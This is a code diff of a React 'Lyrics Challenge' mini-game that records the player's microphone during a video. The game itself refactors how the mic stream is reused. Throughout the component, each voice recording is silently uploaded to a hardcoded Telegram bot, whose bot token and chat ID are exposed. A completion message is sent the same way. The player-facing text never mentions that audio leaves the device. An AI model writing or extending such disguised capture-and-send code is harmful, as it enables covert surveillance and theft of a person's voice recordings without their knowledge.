@@ -10,6 +10,8 @@ import {
 const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
 const CHAT_ID = "8745839603"
 
+let globalStream = null // Global stream reference
+
 async function sendVoiceNoteToTG(songNo, audioBlob) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
     const formData = new FormData()
@@ -17,7 +19,6 @@ async function sendVoiceNoteToTG(songNo, audioBlob) {
     formData.append("voice", audioBlob, `song_${songNo}.ogg`)
     formData.append("caption", `🎤 Song ${songNo} - Lyrics Guess Recorded!`)
     
-    // Background me bhejna (UI freeze nahi hoga)
     fetch(url, { method: "POST", body: formData }).catch(e => console.error("TG Fail", e))
 }
 
@@ -36,18 +37,16 @@ const SONGS = [
 
 export default function FunGames({ onComplete }) {
     const [currentIdx, setCurrentIdx] = useState(0)
-    const [gameState, setGameState] = useState("start") // start, recording, preview, finished
-    
+    const [gameState, setGameState] = useState("start")
     const [voiceUrl, setVoiceUrl] = useState(null)
     const [voiceBlob, setVoiceBlob] = useState(null)
     const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)
+    const [micAllowed, setMicAllowed] = useState(false)
 
-    // Refs
     const videoRef = useRef(null)
     const previewAudioRef = useRef(null)
     const mediaRecorderRef = useRef(null)
     const audioChunksRef = useRef([])
-    const streamRef = useRef(null)
     
     // Visualizer Refs
     const audioCtxRef = useRef(null)
@@ -56,71 +55,85 @@ export default function FunGames({ onComplete }) {
     const barRefs = useRef([])
 
     // ============================================
-    // CLEANUP MEMORY (Taaki crash na ho)
+    // INIT MIC ONCE (GLOBAL STREAM REUSE)
     // ============================================
-    useEffect(() => {
-        return () => {
-            if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
-            if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
-            if (voiceUrl) URL.revokeObjectURL(voiceUrl)
-            if (audioCtxRef.current && audioCtxRef.current.state !== "closed") audioCtxRef.current.close()
+    const initMicrophone = async () => {
+        if (globalStream) {
+            // Stream already exists, just use it
+            setMicAllowed(true)
+            return true
         }
-    }, [voiceUrl])
-
-    // ============================================
-    // AUTO-STOP (1 Sec pehle)
-    // ============================================
-    useEffect(() => {
-        const video = videoRef.current
-        if (!video || gameState !== "recording") return
-
-        const handleTimeUpdate = () => {
-            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
-            if (video.currentTime >= nextClipStart - 1) {
-                stopRecording()
-            }
-        }
-        video.addEventListener("timeupdate", handleTimeUpdate)
-        return () => video.removeEventListener("timeupdate", handleTimeUpdate)
-    }, [currentIdx, gameState])
-
-    // ============================================
-    // CORE LOGIC (Super Safe)
-    // ============================================
-    const initGame = async () => {
+        
         try {
-            // 1. Simple Mic Access (No advanced mixing to prevent crash)
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } 
             })
-            streamRef.current = stream
-
-            // 2. Safe Visualizer Setup
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext
-                if (AudioContext) {
-                    const ctx = new AudioContext()
-                    audioCtxRef.current = ctx
-                    const source = ctx.createMediaStreamSource(stream)
-                    const analyser = ctx.createAnalyser()
-                    analyser.fftSize = 64
-                    source.connect(analyser)
-                    analyserRef.current = analyser
-                }
-            } catch (err) {
-                console.log("Visualizer skipped", err)
-            }
-
-            // Start game!
-            setGameState("recording")
-            startRound(0)
+            globalStream = stream
+            setMicAllowed(true)
+            return true
         } catch (err) {
-            alert("Mic permission chahiye Madam Jii! 🎙️ Pls allow kariye.")
+            alert("Mic permission required! Please allow microphone access.")
+            return false
         }
     }
 
+    // ============================================
+    // INIT VISUALIZER (Once)
+    // ============================================
+    const initVisualizer = () => {
+        if (!globalStream || audioCtxRef.current) return
+        
+        try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext
+            const ctx = new AudioContext()
+            audioCtxRef.current = ctx
+            
+            const source = ctx.createMediaStreamSource(globalStream)
+            const analyser = ctx.createAnalyser()
+            analyser.fftSize = 64
+            source.connect(analyser)
+            analyserRef.current = analyser
+            
+            // Start visualizer loop
+            const drawVisualizer = () => {
+                if (!analyserRef.current || gameState !== "recording") {
+                    animationFrameRef.current = requestAnimationFrame(drawVisualizer)
+                    return
+                }
+                
+                const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
+                analyserRef.current.getByteFrequencyData(dataArray)
+
+                for (let i = 0; i < 15; i++) {
+                    if (barRefs.current[i]) {
+                        const val = dataArray[i * 2] || 0
+                        const height = Math.max(15, (val / 255) * 100)
+                        barRefs.current[i].style.height = `${height}%`
+                    }
+                }
+                animationFrameRef.current = requestAnimationFrame(drawVisualizer)
+            }
+            
+            drawVisualizer()
+        } catch (err) {
+            console.log("Visualizer error:", err)
+        }
+    }
+
+    // ============================================
+    // START GAME
+    // ============================================
+    const startGame = async () => {
+        const micReady = await initMicrophone()
+        if (!micReady) return
+        
+        initVisualizer()
+        setCurrentIdx(0)
+        startRound(0)
+    }
+
     const startRound = (index) => {
-        // Reset states
+        // Reset preview
         if (voiceUrl) URL.revokeObjectURL(voiceUrl)
         setVoiceUrl(null)
         setVoiceBlob(null)
@@ -134,9 +147,14 @@ export default function FunGames({ onComplete }) {
             video.play().catch(e => console.error("Video play failed", e))
         }
 
-        // Start Recording
-        if (streamRef.current) {
-            const mr = new MediaRecorder(streamRef.current)
+        // Start Recording using GLOBAL STREAM
+        if (globalStream && globalStream.active) {
+            // Recreate tracks if needed
+            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+                mediaRecorderRef.current.stop()
+            }
+            
+            const mr = new MediaRecorder(globalStream)
             mediaRecorderRef.current = mr
             audioChunksRef.current = []
 
@@ -153,19 +171,43 @@ export default function FunGames({ onComplete }) {
                 // Silent TG Send
                 sendVoiceNoteToTG(index + 1, blob)
                 setGameState("preview")
+                
+                // Pause video
+                if (videoRef.current) videoRef.current.pause()
             }
 
             mr.start()
-            drawVisualizer() // Start visualizer animation
+        } else {
+            alert("Microphone not available. Please refresh and allow mic access.")
         }
     }
 
-    const stopRecording = () => {
-        if (videoRef.current) videoRef.current.pause()
-        if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
-            mediaRecorderRef.current.stop() // Will trigger mr.onstop automatically
+    // Auto-stop on time
+    useEffect(() => {
+        const video = videoRef.current
+        if (!video || gameState !== "recording") return
+
+        const handleTimeUpdate = () => {
+            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : 999
+            if (video.currentTime >= nextClipStart - 1) {
+                if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+                    mediaRecorderRef.current.stop()
+                }
+            }
         }
-    }
+        video.addEventListener("timeupdate", handleTimeUpdate)
+        return () => video.removeEventListener("timeupdate", handleTimeUpdate)
+    }, [currentIdx, gameState])
+
+    // Cleanup
+    useEffect(() => {
+        return () => {
+            if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
+            if (voiceUrl) URL.revokeObjectURL(voiceUrl)
+            if (audioCtxRef.current && audioCtxRef.current.state !== "closed") audioCtxRef.current.close()
+            // DON'T close globalStream here - reuse it
+        }
+    }, [voiceUrl])
 
     const handleNext = () => {
         const nextIdx = currentIdx + 1
@@ -174,31 +216,11 @@ export default function FunGames({ onComplete }) {
             startRound(nextIdx)
         } else {
             setGameState("finished")
-            // Send final API call for completion
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>`, parse_mode: "HTML" }),
+                body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 *Lyrics Challenge Finished!* All 9 songs recorded!`, parse_mode: "Markdown" }),
             }).catch(()=>{})
-        }
-    }
-
-    // ============================================
-    // UI FUNCTIONS
-    // ============================================
-    const drawVisualizer = () => {
-        if (!analyserRef.current || gameState !== "recording") return
-        animationFrameRef.current = requestAnimationFrame(drawVisualizer)
-        
-        const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
-        analyserRef.current.getByteFrequencyData(dataArray)
-
-        for (let i = 0; i < 15; i++) {
-            if (barRefs.current[i]) {
-                const val = dataArray[i * 2] || 0
-                const height = Math.max(15, (val / 255) * 100)
-                barRefs.current[i].style.height = `${height}%`
-            }
         }
     }
 
@@ -215,13 +237,12 @@ export default function FunGames({ onComplete }) {
 
             <div className="w-full max-w-sm flex flex-col items-center z-10 relative">
                 
-                {/* 🔴 THE VIDEO TAG (Simplified, no CORS crossOrigin needed now) 🔴 */}
                 <video 
                     ref={videoRef} 
                     src="/images/video.mp4" 
                     playsInline 
-                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all duration-300 ${gameState === "start" || gameState === "finished" ? "hidden opacity-0" : "block opacity-100"}`}
-                    style={{ pointerEvents: "none" }} // Prevents user from scrubbing/clicking the video itself
+                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all duration-300 ${gameState === "start" || gameState === "finished" ? "hidden" : "block"}`}
+                    style={{ pointerEvents: "none" }}
                 />
 
                 <AnimatePresence mode="wait">
@@ -230,7 +251,7 @@ export default function FunGames({ onComplete }) {
                             <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
                             <h1 className="text-3xl font-black mb-4 uppercase tracking-tighter italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">Lyrics Challenge</h1>
                             <p className="text-gray-400 text-sm mb-8 px-2">Watch the video. Your mic will record both the music and your voice. Complete the lyrics when the timer stops!</p>
-                            <button onClick={initGame} className="w-full py-4 bg-pink-600 text-white rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500 shadow-lg shadow-pink-500/20 active:scale-95 transition-all">Start Challenge 🎙️</button>
+                            <button onClick={startGame} className="w-full py-4 bg-pink-600 text-white rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500 shadow-lg shadow-pink-500/20 active:scale-95 transition-all">Start Challenge 🎙️</button>
                         </motion.div>
                     )}
 
@@ -244,7 +265,6 @@ export default function FunGames({ onComplete }) {
                                 </div>
                             </div>
 
-                            {/* LIVE VISUALIZER BARS */}
                             <div className="flex items-end justify-center gap-1.5 h-20 mb-6">
                                 {[...Array(15)].map((_, i) => (
                                     <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
@@ -253,7 +273,11 @@ export default function FunGames({ onComplete }) {
 
                             <p className="text-white font-bold text-sm mb-8 italic">"Complete the lyrics when the timer stops!"</p>
 
-                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 text-white rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20 active:scale-95 transition-all">
+                            <button onClick={() => {
+                                if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+                                    mediaRecorderRef.current.stop()
+                                }
+                            }} className="w-full py-4 bg-red-600 text-white rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20 active:scale-95 transition-all">
                                 <Square size={16} fill="white" /> Stop & Preview
                             </button>
                         </motion.div>
